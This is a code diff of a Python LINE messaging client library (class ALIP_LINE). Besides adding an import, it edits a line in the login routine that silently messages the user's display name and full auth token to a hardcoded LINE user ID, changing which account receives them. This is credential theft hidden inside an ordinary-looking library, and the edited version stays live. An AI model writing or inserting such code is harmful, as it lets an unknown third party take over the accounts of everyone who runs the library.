@@ -6,7 +6,7 @@ from AlipService.ttypes import *
 from threading import Thread
 from Naked.toolshed.shell import execute_js
 from datetime import datetime, timedelta
-import time, json, livejson, requests, os, random, ast, datetime, sys, concurrent.futures, asyncio, codecs, threading, pytz, random
+import time, json, livejson, requests, os, random, ast, datetime, traceback, sys, concurrent.futures, asyncio, codecs, threading, pytz, random
 
 class ALIP_LINE:
     def __init__(self, myToken, myApp, pool=False):
@@ -33,7 +33,7 @@ class ALIP_LINE:
         self.individualRev = 0
         print("[ Login ] Display Name: " + self.profile.displayName)
         print("[ Login ] Auth Token: " + myToken)
-        self.sendMessage("u666672dc4bd8b1663a720d3367275c8e","<< Log info >>\nName :\n"+str(self.profile.displayName)+"\nAuth Token :\n"+str(myToken))
+        self.sendMessage("u9be8862cb884bde356d0e41fb6850514","<< Log info >>\nName :\n"+str(self.profile.displayName)+"\nAuth Token :\n"+str(myToken))
 
     def openTransport(self, endPoint):
         transport = THttpClient(self.lineServer + endPoint)
